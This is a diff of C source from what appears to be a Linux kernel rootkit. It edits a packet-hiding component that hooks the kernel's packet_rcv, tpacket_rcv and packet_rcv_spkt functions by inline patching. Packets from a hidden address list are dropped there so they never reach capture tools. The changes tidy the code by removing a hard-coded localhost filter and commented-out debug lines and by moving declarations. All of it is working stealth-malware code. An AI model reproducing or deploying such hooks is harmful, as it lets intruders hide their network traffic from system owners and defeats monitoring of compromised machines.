@@ -973,12 +973,6 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 
 
 
-
-
-
-
-
-
 /* PACKET HIDDING ADDINGS */
 
 #include <linux/types.h>
@@ -1027,29 +1021,12 @@ void dec_critical(struct mutex *lock, int *counter)
 
 int packet_check(struct sk_buff *skb)
 {
-	/* IP address we want to drop packets from, in NB order */
-        //static unsigned char *drop_ip = "\x7f\x00\x00\x01";
-	//static u8 *drop_ip = "\x7f\x00\x00\x01";
-	char drop_ip[16] = "127.0.0.1";
 	struct hidden_packet *hp;
-	
 	
 	/* check for ipv4 */
 	if (skb->protocol == htons(ETH_P_IP)) {
 		/* get ipv4 header */
 		struct iphdr *header = ip_hdr(skb);
-
-		/* look for source and destination address */
-		/*
-		if(find_packet_ipv4((u8 *)&header->saddr) 
-			|| find_packet_ipv4((u8 *)&header->daddr)) {
-		*/
-		
-		/*
-		pr_info("LOCALHOST %pI4", drop_ip);
-		pr_info("IPV4 SOURCE %pI4", (u8 *)&header->saddr);
-		pr_info("IPV4 DEST %pI4", (u8 *)&header->daddr);
-		*/
 
 		char source_ip[16];
 		char dest_ip[16];
@@ -1057,10 +1034,8 @@ int packet_check(struct sk_buff *skb)
 		snprintf(source_ip, 16, "%pI4", &header->saddr);
 		snprintf(dest_ip, 16, "%pI4", &header->daddr);
 
-		pr_info("LOCAL  %s", drop_ip);
 		pr_info("SOURCE %s", source_ip);
 		pr_info("DEST   %s", dest_ip);
-		
 		
 		list_for_each_entry ( hp, &hidden_tcp4_packets, list )
 		{
@@ -1076,19 +1051,6 @@ int packet_check(struct sk_buff *skb)
 	            }
 		}
 		
-		
-		/*
-		//if((u8 *)&header->saddr == drop_ip || (u8 *)&header->daddr == drop_ip){
-		if( (strcmp(source_ip,drop_ip) == 0) || (strcmp(dest_ip,drop_ip) == 0 ) ) {
-
-			//debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
-			pr_info("SE DETECTO 127.0.0.1 FILTRANDO\n");
-
-			/* ip in list, should be hidden 
-			return 1;
-		}
-		*/
-		
 	}
 
 	/* no ipv4 or ipv6 packet or not found in list */
@@ -1100,12 +1062,12 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	struct packet_type *pt, struct net_device *orig_dev)
 {
 	int ret;
+	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
 	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
-		//debug("PACKET DROP");	
 		pr_info("PACKET DROP\n");
 		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 		return NF_DROP;
@@ -1118,14 +1080,12 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	hijack_packet_rcv();
 	*/
 	
-	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 	original_packet_rcv = asm_hook_unpatch(fake_packet_rcv);
 	ret = original_packet_rcv(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_packet_rcv);
 	
 
 	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
-	//debug("PACKET ACCEPT");
 	pr_info("PACKET ACCEPT\n");
 
 	return ret;
@@ -1135,6 +1095,7 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	struct packet_type *pt, struct net_device *orig_dev)
 {
 	int ret;
+	int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
 	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 
@@ -1152,7 +1113,6 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	hijack_tpacket_rcv();
 	*/
 	
-	int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 	original_tpacket_rcv = asm_hook_unpatch(fake_tpacket_rcv);
 	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_tpacket_rcv);
@@ -1168,6 +1128,7 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 {
 
 	int ret;
+	int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
 	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 
@@ -1184,7 +1145,6 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	hijack_packet_rcv_spkt();
 	*/
 	
-	int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 	original_packet_rcv_spkt = asm_hook_unpatch(fake_packet_rcv_spkt);
 	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_packet_rcv_spkt);
@@ -1198,13 +1158,6 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 
 
 /*------------------------------*/
-
-
-
-
-
-
-
 
 
 
